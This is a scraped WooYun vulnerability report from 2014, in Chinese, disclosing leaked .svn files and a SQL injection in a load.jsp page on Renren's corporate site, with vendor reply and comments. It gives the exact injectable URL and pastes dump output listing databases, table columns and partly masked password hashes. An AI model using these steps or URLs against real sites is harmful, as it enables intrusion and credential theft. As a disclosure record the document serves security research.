{"id": 3878, "wybug_id": "wooyun-2014-057442", "wybug_title": "人人网官网源码泄露&amp;分析代码定位到sql注入点", "wybug_corp": "人人网", "wybug_author": "浩天", "wybug_date": "2014-04-17 17:40", "wybug_open_date": "2014-06-01 17:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射", "注射技巧", "源码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向公众公开  简要描述： 怀念叫“校内网”的日子 详细说明：  站点：人人网公司主站地址：http://www.renren-inc.com/   漏洞证明：  1.svn日志文件泄露，导致下载源码http://www.renren-inc.com/zh/contact/.svn/entrieshttp://www.renren-inc.com/zh/css/.svn/entrieshttp://www.renren-inc.com/zh/culture/.svn/entrieshttp://www.renren-inc.com/zh/hr/.svn/entrieshttp://www.renren-inc.com/zh/images/.svn/entrieshttp://www.renren-inc.com/zh/info/.svn/entrieshttp://www.renren-inc.com/zh/news/.svn/entrieshttp://www.renren-inc.com/en/contact/.svn/entrieshttp://www.renren-inc.com/en/css/.svn/entrieshttp://www.renren-inc.com/en/culture/.svn/entrieshttp://www.renren-inc.com/en/images/.svn/entrieshttp://www.renren-inc.com/en/info/.svn/entrieshttp://www.renren-inc.com/en/news/.svn/entrieshttp://www.renren-inc.com/en/pdf/.svn/entries\n\n2.看了下源码，数据库交互的地方比较少，发现load.jsp有一处，没有处理，应该是注入点\n\n简单构造了下，获取如下地址：http://www.renren-inc.com/zh/news/load.jsp?col=%E5%8D%83%E6%A9%A1%E9%9B%86%E5%9B%A2然后尝试注入\n\n然后就.....web application technology: JSPback-end DBMS: MySQL 5.0.11available databases [4]:[*] information_schema[*] mysql[*] oak[*] testDatabase: oak[9 tables]+----------------+| action_history || article        || breakingnews   || chip           || chip_history   || honors         || managergroup   || publicity      || user           |+----------------+Database: oakTable: user[8 columns]+-------------+--------------+| Column      | Type         |+-------------+--------------+| create_time | datetime     || deleted     | int(11)      || email       | varchar(255) || id          | int(11)      || level       | int(11)      || passwd      | varchar(255) || realname    | varchar(255) || username    | varchar(255) |+-------------+--------------+Database: oakTable: user[2 entries]+----+-------+----------------------------------+----------+| id | email | passwd                           | username |+----+-------+----------------------------------+----------+| 5  |       | 7c5c0149be1d*********2c0e9e7414f | libei    || 6  |       | 77d6b67510c9*********6ca5da6a85d | gongguan |+----+-------+----------------------------------+----------+mysql.userroot:*EFB705E7253A223************B2AD4E1947F80:localhost    解密：oak***fic 打个码root::BJDX39-27.opi.comroot::127.0.0.1::localhost::BJDX39-27.opi.com   修复方案：  要下班了，不玩了   版权声明：转载请注明来源 浩天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-04-17 17:44 厂商回复： 感谢提醒，thks 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-17 18:02 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  我操 求一份源码啊    \n     2014-04-17 18:02 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  mark    \n     2014-04-17 18:06 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  标题写的是不是有点大了，貌似你们想多了    \n     2014-04-17 18:10 |    \t\t惆惆怅XD \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | CNU)\t\t \n  我操 求一份源码啊    \n     2014-04-18 01:01 |    \t\t草榴社区 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:26        | 未满18周岁,不准进入.)\t\t \n  给你们源码,你也不会用,会用也不敢开.而且,这个显然是标题党.绝对不可能是人人网主站的源码.    \n     2014-04-18 07:09 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  楼上正解    \n     2014-06-01 20:21 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  @草榴社区 社区邀请码有吗？净网行动对您伤害大吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}